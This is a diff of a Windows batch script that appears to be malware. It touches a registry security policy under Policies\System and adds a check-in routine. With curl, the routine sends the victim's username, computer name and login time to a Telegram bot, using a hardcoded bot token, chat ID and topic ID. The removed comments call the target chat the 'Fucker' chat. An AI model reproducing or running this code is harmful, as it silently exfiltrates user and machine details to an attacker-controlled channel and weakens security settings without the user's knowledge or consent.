@@ -17,27 +17,36 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 
 
 
-:: SEND MSG
-
-:: Fucker CHAT ID : -1002163721260
-:: Output CHAT ID : -1002460905948
+:: ============ RUNNING TOPIC ============
 
 
 :: Set bot token, chat ID, and message
-set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
-set "CHAT_ID=-1002163721260"
-set "MESSAGEEVERY=%USERNAME%(%COMPUTERNAME%)|LoggedIn|%time%....."
+set "TOKEN_RUNNING=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
+set "CHAT_ID_RUNNING=-1002163721260"
+set "TOPIC_ID_RUNNING=73779"
+set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|LoggedIn|%time%....."
+set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
+set "CAPTION_RUNNING=This is a document for RUNNING Topic"
+set "FILE_PATH_RUNNING=%temp%\RUNNING_Topic.txt"
 
 
-:: URL encode the message by replacing spaces with %20
-set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
 
-:: Send the message using curl
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
-     -d "chat_id=%CHAT_ID%" ^
-     -d "text=%ENCODED_MESSAGE%"
 
-echo Message sent to chat ID %CHAT_ID%
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendMessage" ^
+     -d "chat_id=%CHAT_ID_RUNNING%" ^
+     -d "message_thread_id=%TOPIC_ID_RUNNING%" ^
+     -d "text=%ENCODED_MESSAGE_RUNNING%"
+
+
+
+
+
+
+
+
+
+
 
 
 
